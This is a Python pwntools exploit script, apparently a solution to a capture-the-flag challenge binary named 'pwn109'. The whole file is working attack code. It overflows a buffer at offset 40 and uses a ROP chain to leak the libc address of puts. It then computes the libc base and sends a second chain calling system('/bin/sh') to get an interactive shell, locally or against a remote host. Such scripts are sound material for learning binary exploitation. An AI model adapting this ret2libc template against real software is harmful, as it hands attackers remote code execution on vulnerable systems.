from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './pwn109'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

rop = ROP(elf)


pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret_addr = rop.find_gadget(["ret"])[0]

# Build the payload
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.sym.main
    ]
})

# Send the payload
io.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)

leak_addr = u64(io.recv(8).strip().ljust(8, b"\x00"))
info("leaked got_puts: %#x", leak_addr)

libc.address = leak_addr - libc.sym.puts
info("libc_base: %#x", libc.address)

system = libc.sym.system
info("system: %#x", system)

bin_sh = next(libc.search(b"/bin/sh"))
info("bin_sh: %#x", bin_sh)



payload2 = flat({
    offset: [
        ret_addr,
        pop_rdi,
        bin_sh,
        system
    ]
})

io.sendline(payload2)
 

# Got Shell?
io.interactive()

#system 050050
# put 79e60
# /bin/sh 19ce43